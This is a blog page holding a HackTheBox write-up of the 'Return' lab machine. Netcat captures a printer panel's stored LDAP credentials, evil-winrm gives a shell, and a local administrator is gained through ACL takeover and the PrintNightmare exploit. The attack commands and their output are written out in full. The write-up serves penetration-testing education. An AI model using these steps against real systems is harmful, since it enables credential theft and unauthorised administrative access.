<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Return | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Computer Security,Cyber Security,Pentesting"><meta name=description content="Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer’s address to my IP, I can obtain the unmasked password. Enumerating the user’s info reveals that it’s member of two privileged groups which can then be abused to gain administrative access in multiple ways."><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/return/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Return"><meta property="og:description" content="Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways."><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/return/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-10-24T09:12:47+07:00"><meta property="article:modified_time" content="2021-10-24T09:12:47+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/antique/"><meta property="og:see_also" content="https://fahmifj.github.io/blog/play-with-printnightmare/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391.png"><meta name=twitter:title content="HackTheBox - Return"><meta name=twitter:description content="Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Return","item":"https://fahmifj.github.io/hackthebox/return/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Return","name":"HackTheBox - Return","description":"Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer\u0026rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user\u0026rsquo;s info reveals that it\u0026rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.","keywords":["HackTheBox","CTF","Computer Security","Cyber Security","Pentesting"],"articleBody":"Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer’s address to my IP, I can obtain the unmasked password. Enumerating the user’s info reveals that it’s member of two privileged groups which can then be abused to gain administrative access in multiple ways.\nSkills Learned Abusing network printer Abusing Windows Server Operators group Tools Nmap Netcat ACL-FullControl.ps1 ACL-RevokeFullControl.ps1 PrintNightmare LPE Reconnaissance Nmap Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.\n→ kali@kali «return» «10.10.14.13» $ fscan 10.10.11.108 return nmap -p- 10.10.11.108 | grep '^[0-9]' | cut -d '/' -f1 | tr '\\n' ',' | sed 's/,$//' nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-15 18:48 EDT Nmap scan report for 10.10.11.108 Host is up (0.066s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: HTB Printer Admin Panel 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-15 23:14:10Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49673/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 59797/tcp open msrpc Microsoft Windows RPC Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 25m20s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-10-15T23:15:10 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72.44 seconds Enumeration TCP 445 - SMB On SMB, anonymous login is allowed, but there is no share available.\n→ kali@kali «return» «10.10.14.11» $ smbclient -N -L //10.10.11.108/ Anonymous login successful Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available I tried to enumerate the domain users, but got access denied.\n→ kali@kali «return» «10.10.14.11» $ rpcclient -U '%' 10.10.11.108 rpcclient $\u003e srvinfo Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED rpcclient $\u003e enumdomusers result was NT_STATUS_ACCESS_DENIED TCP 389 - LDAP Without creds, there is no hope here.\n→ kali@kali «return» «10.10.14.11» $ ldapsearch -LLL -x -h 10.10.11.108 -b \"dc=return,dc=local\" Operations error (1) Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563 TCP 80 - Printer Panel A printer admin panel for managing printer is shown on port 80.\nUnder the settings menu, I can see the printer’s configuration, which reveals a username and a masked password. This password can’t be unmasked by modifying the HTML attribute.\nClicking on the update button sends out a POST request with parameter ip to Return’s IP.\nThe key takeaway from this is that I was the one who triggered that request.\nFoothold Shell as svc-printer Capturing Password From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.\nThe answer is the password pops up on my listener.\n→ kali@kali «return» «10.10.14.11» $ nc -nvlp 389 listening on [any] 389 ... connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 50904 0*`%return\\svc-printer� 1edFg43012!! CrackMapExec shows that return\\svc-printer:1edFg43012!! is a valid credentials.\n→ kali@kali «return» «10.10.14.11» $ crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' SMB 10.10.11.108 445 PRINTER [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False) SMB 10.10.11.108 445 PRINTER [+] return.local\\svc-printer:1edFg43012!! → kali@kali «return» «10.10.14.11» $ crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' WINRM 10.10.11.108 5985 PRINTER [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local) WINRM 10.10.11.108 5985 PRINTER [*] http://10.10.11.108:5985/wsman WINRM 10.10.11.108 5985 PRINTER [+] return.local\\svc-printer:1edFg43012!! (Pwn3d!) WinRM - svc-printer I can login via WinRM and grab the flag.\n→ kali@kali «return» «10.10.14.11» $ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p'1edFg43012!!' Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents\u003e *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents\u003e cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop\u003e gci Directory: C:\\Users\\svc-printer\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 10/14/2021 10:33 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop\u003e gc user.txt 48ba9...[SNIP]... Privilege Escalation Administrative Access Enumeration Checking user’s privileges with whoami reveals that svc-printer is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop\u003e whoami /all USER INFORMATION ---------------- User Name SID ================== ============================================= return\\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103 GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Server Operators Alias S-1-5-32-549 Mandatory group, Enabled by default, Enabled group BUILTIN\\Print Operators Alias S-1-5-32-550 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemtimePrivilege Change the system time Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. According to this site, Server Operators is:\nA built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.\nI can say that Server Operators is the ultimate version of Backup Operators.\nAs for Print Operators, I’ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using SeLoadDriverPrivilege. I don’t demo it here, so see this awesome post by 0xdf instead.\nFurther enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).\n*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop\u003e Get-Service -Name Spooler Status Name DisplayName ------ ---- ----------- Running Spooler Print Spooler DiskShadow (failed) The back up and restore files involve two access tokens: SeBackupPrivilege and SeRestorePrivilege. These tokens were previously abused to dump AD database (NTDS.d) in HTB: Blackfield.\nI tried to reproduce the attack here, but I got the following results.\n*Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e diskshadow /s script.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: PRINTER, 10/16/2021 1:24:40 PM -\u003e set context persistent nowriters -\u003e add volume c: alias iamf COM call \"(*vssObject)-\u003eInitializeForBackup\" failed. The intended way, according to the official writeup, is to abuse the Server Operators ability to start/stop/modify services, but I’ll put that aside.\nACL Full Access There is another way that still involves the SeBackupPrivilege and SeRestorePrivilege. It’s to modify ACL and grant myself full access to the file/folder I specified using this PowerShell script. In the following, I use that script to own the entire admin’s desktop folder.\n*Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003eAcl-FullControl -user return\\svc-printer -path c:\\users\\administrator\\desktop [+] Current permissions: Path : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\administrator\\desktop Owner : BUILTIN\\Administrators Group : RETURN\\Domain Users Access : NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullControl RETURN\\Administrator Allow FullControl Audit : Sddl : O:BAG:DUD:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA) [+] Changing permissions to c:\\users\\administrator\\desktop [+] Acls changed successfully. Path : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\administrator\\desktop Owner : BUILTIN\\Administrators Group : RETURN\\Domain Users Access : RETURN\\svc-printer Allow FullControl NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullControl RETURN\\Administrator Allow FullControl Audit : Sddl : O:BAG:DUD:AI(A;OICI;FA;;;S-1-5-21-3750359090-2939318659-876128439-1103)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA) Now I can read the flag\n*Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e type \\users\\administrator\\desktop\\root.txt 9f8dd...[SNIP]... I also made the anti script to revert what I did on the admin’s desktop folder.\n*Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e Acl-RevokeFullControl -User return\\svc-printer -Path C:\\users\\administrator\\desktop [+] Current permissions: Path : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\administrator\\desktop Owner : BUILTIN\\Administrators Group : RETURN\\Domain Users Access : RETURN\\svc-printer Allow FullControl NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullControl RETURN\\Administrator Allow FullControl Audit : Sddl : O:BAG:DUD:AI(A;OICI;FA;;;S-1-5-21-3750359090-2939318659-876128439-1103)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA) [+] User permissions to remove on C:\\users\\administrator\\desktop FileSystemRights : FullControl AccessControlType : Allow IdentityReference : RETURN\\svc-printer IsInherited : False InheritanceFlags : ContainerInherit, ObjectInherit PropagationFlags : None [+] Acls changed successfully. Path : Microsoft.PowerShell.Core\\FileSystem::C:\\users\\administrator\\desktop Owner : BUILTIN\\Administrators Group : RETURN\\Domain Users Access : NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullControl RETURN\\Administrator Allow FullControl Audit : Sddl : O:BAG:DUD:AI(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA) *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e gc \\\\printer\\c$\\users\\administrator\\desktop\\root.txt Access to the path '\\\\printer\\c$\\users\\administrator\\desktop\\root.txt' is denied. At line:1 char:1 + gc \\\\printer\\c$\\users\\administrator\\desktop\\root.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (\\\\printer\\c$\\us...esktop\\root.txt:String) [Get-Content], UnauthorizedAccessException + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand (Alternative) PrintNightmare LPE And here’s the ultimate exploit.\n*Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e Import-Module .\\CVE-2021-1675.ps1 *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e Invoke-Nightmare -NewUser \"choropys\" -NewPassword \"ch0ropys!\" [+] created payload at C:\\Users\\svc-printer\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\mxdwdrv.dll\" [+] added user choropys as local administrator [+] deleting payload from C:\\Users\\svc-printer\\AppData\\Local\\Temp\\nightmare.dll *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator choropys Guest krbtgt svc-printer The command completed with one or more errors. The hard way to read the root flag (afaik this won’t work if WinRM disabled).\n*Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e $username = \"choropys\" *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e $password = ConvertTo-SecureString \"ch0ropys!\" -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { gci C:/users/administrator/desktop/root.txt } Directory: C:\\users\\administrator\\desktop Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -ar--- 10/14/2021 10:33 PM 34 root.txt localhost *Evil-WinRM* PS C:\\Users\\svc-printer\\chrp\u003e Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { gc C:/users/administrator/desktop/root.txt } 9f8dd...[SNIP]... ","wordCount":"1768","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391.png","datePublished":"2021-10-24T09:12:47+07:00","dateModified":"2021-10-24T09:12:47+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/return/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Return</h1><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>October 24, 2021
</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/hacking-printers/>Hacking Printers</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li><li><a href=#tcp-389---ldap aria-label="TCP 389 - LDAP">TCP 389 - LDAP</a></li><li><a href=#tcp-80---printer-panel aria-label="TCP 80 - Printer Panel">TCP 80 - Printer Panel</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-svc-printer aria-label="Shell as svc-printer">Shell as svc-printer</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#administrative-access aria-label="Administrative Access">Administrative Access</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391_hubfd8dc13c6f8945ad093d4996c4fa749_101361_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391_hubfd8dc13c6f8945ad093d4996c4fa749_101361_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391_hubfd8dc13c6f8945ad093d4996c4fa749_101361_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391.png 875w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/return/imgs/image-20211024125356391.png alt="HackTheBox - Return" width=875 height=645><p>HackTheBox - Return</p></figure><p>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Abusing network printer</li><li>Abusing Windows Server Operators group</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Netcat</li><li><a href=https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1>ACL-FullControl.ps1</a></li><li><a href=https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1>ACL-RevokeFullControl.ps1</a></li><li><a href=https://github.com/calebstewart/CVE-2021-1675>PrintNightmare LPE</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ fscan 10.10.11.108 <span class=k>return</span>
</span></span><span class=line><span class=cl>nmap -p- 10.10.11.108 <span class=p>|</span> grep <span class=s1>&#39;^[0-9]&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f1 <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/,$//&#39;</span>
</span></span><span class=line><span class=cl>nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-10-15 18:48 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.108
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.066s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain        Simple DNS Plus
</span></span><span class=line><span class=cl>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: HTB Printer Admin Panel
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-10-15 23:14:10Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: <span class=k>return</span>.local0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: <span class=k>return</span>.local0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class=line><span class=cl>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
